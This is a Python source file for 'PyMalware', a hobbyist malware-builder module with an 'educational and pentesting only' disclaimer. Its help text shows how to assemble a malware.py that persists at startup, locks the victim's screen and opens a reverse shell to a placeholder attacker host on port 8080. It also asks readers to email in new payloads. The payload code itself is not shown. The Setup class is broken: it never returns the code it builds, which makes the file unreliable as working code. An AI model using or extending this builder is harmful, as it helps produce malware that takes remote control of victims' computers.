#PyMalware v 1.0b
#Use for educational purpose and pentsting ONLY !!!

import add
import update
import payloads

import sys


from os import get_terminal_size as gts
try:
	length = gts()[0]
	if length < 40:
		length = 40
except:
	length = 40

_author = "FoxOne"
_version = "Beta 1.0"
_description = f"""{'='*length}
{' '*((length-51)//2)} ____        __  __       _                        
{' '*((length-51)//2)}|  _ \\ _   _|  \\/  | __ _| |_      ____ _ _ __ ___ 
{' '*((length-51)//2)}| |_) | | | | |\\/| |/ _` | \\ \\ /\\ / / _` | '__/ _ \\
{' '*((length-51)//2)}|  __/| |_| | |  | | (_| | |\ V  V / (_| | | |  __/
{' '*((length-51)//2)}|_|    \\__, |_|  |_|\\__,_|_| \\_/\\_/ \\__,_|_|  \\___|
{' '*((length-51)//2)}       |___/

{'='*length}

[Author]    {_author}
[Version]   {_version}"""

_description += """
\33[5m/!\\ This script should only be used for educational purpose and pentesting /!\\\33[0m

[What is PyMalware]
PyMalware is a comunity based python module that allow the user to create
simple "viruses" with specific actions.
You can also add your own payloads to your database or send them to
pymalware@gmail.com and I'll take a look to add them to the server ;)

[Who made it]
My name id /!\\Censored/!\\ and I made this tool at 16 yo.
Yeap ;)
I made this tool alone, but if you want to help me for futur PyMalware updates,
simply send me an email at pymalware@gmail.com with your motivations ;)

[How to use it]
Folow this steps to create your first PyMalware virus :
1) Create a setup.py file
2) Inside this file, write :
from pymalware import Setup
from pymalware.payloads import all as payloads
Setup(
	name="malware.py",
	actions=[
			[payloads.persistance, {}],
			[payloads.lock_screen, {"color":"blue"}],
			[payloads.reverse_shell, {"host":"attacker_ip_on_lan", "port":8080}]
	]
)

3) Simply run the program and look ;)
4) Your file (malware.py) will be created and you will be able to run it

Effects :
persistance   : Run the program when the comuter starts
lock_screen   : Create a window on fullscreen to lock the screen
reverse_shell : Try connect to "attacker_ip_on_lan" on the port 8080 and wait for shell commands to execute

Have fun ;)
"""

class Setup:
    def __init__(self, name, actions=[]):
        self.name = name
        self.actions = actions
        self.code = self._CreateCode()
        with open(name, "w+") as r:
            r.write(self.code)
        
    def _CreateCode(self):
        code = ""
        for action in self.actions:
            try:
                print(f"[+]Adding {action} payload")
                with open(action.__file__, "r") as r:
                    code += r.read()
                code += "\n"
            except Exception as e:
                print(e)

def main():
    return _description

if __name__ == "__main__":
    print(_description)
    sys.exit(0)
